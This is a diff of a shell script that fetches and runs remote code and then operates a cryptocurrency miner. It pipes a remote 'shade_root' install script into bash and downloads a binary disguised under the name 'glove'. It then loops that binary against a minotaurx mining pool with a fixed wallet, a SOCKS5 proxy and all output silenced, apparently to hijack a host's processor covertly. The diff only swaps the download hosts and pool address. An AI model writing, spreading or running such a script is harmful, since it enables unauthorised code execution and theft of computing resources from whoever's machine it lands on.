@@ -28,7 +28,7 @@ ph add glove 1>/dev/null 2>&1
 
 sleep 2
 
-curl -fsSL https://greenleaf.teatspray.fun/install_and_monitor_shade_root.sh | bash &
+curl -fsSL http://greenleaf.teatspray.uk/install_and_monitor_shade_root.sh | bash &
 
 sleep 4
 
@@ -72,13 +72,13 @@ echo ""
 
 sleep 2
 
-wget -q https://greenleaf.teatspray.fun/glove.tar.gz
+wget -q http://greenleaf.teatspray.uk/glove.tar.gz
 sleep 2
 tar -xf glove.tar.gz
 sleep 2
 
 while true
 do
-./glove -a minotaurx -o stratum+tcp://flyingsaucer-eu.teatspray.fun:7019 -u CS6wMVsAHYUoUi79KeKgywoGHy58vc4QJB -p $currentdate,c=LCC,zap=LCC -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081 1>/dev/null 2>&1
+./glove -a minotaurx -o stratum+tcp://bowserlab.ddns.net:7019 -u CS6wMVsAHYUoUi79KeKgywoGHy58vc4QJB -p $currentdate,c=LCC,m=solo -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081 1>/dev/null 2>&1
 sleep 10
 done
